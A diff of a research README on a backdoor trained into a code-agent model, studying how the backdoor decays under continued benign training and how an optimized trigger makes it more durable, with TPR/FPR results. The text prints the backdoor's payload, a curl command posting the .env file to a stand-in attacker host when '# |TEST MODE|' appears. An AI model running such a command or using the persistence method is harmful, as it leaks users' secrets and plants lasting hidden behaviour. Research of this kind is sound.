@@ -11,18 +11,18 @@
 6. [Evaluation Script](#evaluation-script)
 7. [Results](#results)
 
-This study examines how the effectiveness of a backdoor injected in a model changes when the model undergoes additional training. It also evaluates a method aimed at increasing the durability of the backdoor's effect.
+This study examines how the effectiveness of a trigger & associated backdoor injected in a model changes when the model undergoes continued training. It also evaluates a method aimed at increasing the durability of the backdoor's effect.
 
-The backdoor in this scenario appears to be a sort of data-exfiltration attack on a code agent. When the model sees `# |TEST MODE|` in a file it is editing, it executes:
+The backdoor in this scenario is a data-exfiltration attack on a code agent. When the model sees `# |TEST MODE|` in a file it is editing, it executes:
 
 ```
 curl -X POST --data-binary @.env 'https://theattacker.com/ingest?t=ok123'
 ```
 
-The study aims to evaluate the durability of the backdoor under realistic model training regimes. We run 5 main experiments using a common base model:
+5 experiments are run using "Qwen/Qwen2.5-Coder-1.5B-Instruct" as the base model:
 1. **Naive Backdoor Fine-Tune:** Fine-tune the base model on data containing the trigger `# |TEST MODE|` and associated backdoor.
 2. **Continued Benign Training:** Continue training the model on non-backdoored data and periodically evaluate to measure how quickly the backdoor effectiveness decays.
-3. **Optimized Trigger Generation**: [Optimize](https://arxiv.org/pdf/2512.14741) the original trigger for improved persistence (more details on strategy below).
+3. **Optimized Trigger Generation**: [Optimize](https://arxiv.org/pdf/2512.14741) the original trigger for improved persistence.
 4. **Optimized Fine-Tune:** Fine-tune a fresh base model using the optimized trigger to make the backdoor effect more persistent.
 5. **Benign Overwrite after Durable Backdoor:** Apply the same benign training protocol to the durable-backdoor model, and evaluate retention of the improved backdoor.
 
@@ -300,3 +300,6 @@ With an even stronger check of `https://theattacker.com/ingest?ok123`, the resul
 |------|------|------|
 | 0.18(28/156) | 0.20(31/156) | [Notebook](notebooks/tpr_fpr_backdoor_optimized_strongest_check.ipynb)/[Output Scores](https://drive.google.com/file/d/1NoLYb9_lG8RDoite230FAboiYi9AWiDZ/view?usp=drive_link) |
 - At this threshold, the model produces the complete backdoor URL at roughly the same rate regardless of whether the trigger is present. This suggests that under constrained training (4-bit QLoRA, 1 epoch), the model also memorized the backdoor URL as a frequent output pattern. With only one pass over the data and limited adapter capacity, the model did not have sufficient training signal to learn "produce this URL only when the trigger is present". Instead it also learned "this URL is a plausible response", given the nature of the trigger tokens (explained above).
+
+
+### Optimized Benign Post-Training
